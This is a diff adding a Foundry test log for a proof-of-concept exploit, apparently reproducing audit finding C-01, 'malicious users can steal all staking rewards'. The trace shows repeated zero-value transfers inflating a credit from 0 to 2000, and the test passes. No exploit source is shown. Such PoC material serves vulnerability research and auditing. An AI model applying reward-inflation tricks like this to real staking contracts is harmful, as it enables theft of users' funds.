@@ -1,0 +1,36 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/44004-c-01-malicious-users-can-steal-all-staking-rewards-from-stak_exp.sol:PoC_44004
+[PASS] test_exploit() (gas: 418958)
+Traces:
+  [418958] PoC_44004::test_exploit()
+    ├─ [332452] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 500
+    │   └─ ← [Return] 1550 bytes of code
+    ├─ [53512] Exploit::run()
+    │   ├─ [23051] Exploit::transfer(ECRecover: [0x0000000000000000000000000000000000000001], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 500
+    │   │   └─ ← [Stop]
+    │   ├─ [1151] Exploit::transfer(ECRecover: [0x0000000000000000000000000000000000000001], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 500 → 1000
+    │   │   └─ ← [Stop]
+    │   ├─ [1151] Exploit::transfer(ECRecover: [0x0000000000000000000000000000000000000001], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 1000 → 1500
+    │   │   └─ ← [Stop]
+    │   ├─ [1151] Exploit::transfer(ECRecover: [0x0000000000000000000000000000000000000001], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 1500 → 2000
+    │   │   └─ ← [Stop]
+    │   ├─ emit Proof(credit: 2000)
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 359.12µs (200.92µs CPU time)
+
+Ran 1 test suite in 4.89ms (359.12µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
